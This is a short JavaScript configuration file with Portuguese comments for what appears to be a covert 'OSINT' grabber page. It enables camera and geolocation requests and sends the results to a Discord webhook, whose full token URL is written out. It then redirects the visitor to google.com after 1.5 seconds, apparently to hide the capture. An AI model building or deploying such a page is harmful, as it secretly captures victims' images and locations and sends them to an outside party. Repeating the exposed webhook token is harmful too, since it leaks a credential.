// config opcional externa (pode ser sobrescrita via querystring)
// Você pode mover webhookUrl e finalUrl para cá e manter index.html limpo

window.OSINT_CONFIG = window.OSINT_CONFIG || {};
Object.assign(window.OSINT_CONFIG, {
  webhookUrl: "https://discord.com/api/webhooks/1502331977410416774/rInHFj167Ch1fBxfC1w5xYegUbe5pU9dAgXKzSiaBe42m13b3DW3eZZGNgm8oHgAFhva",
  finalUrl: "https://www.google.com",
  requestCamera: true,
  requestGeo: true,
  redirectDelayMs: 1500,
  debug: false
});
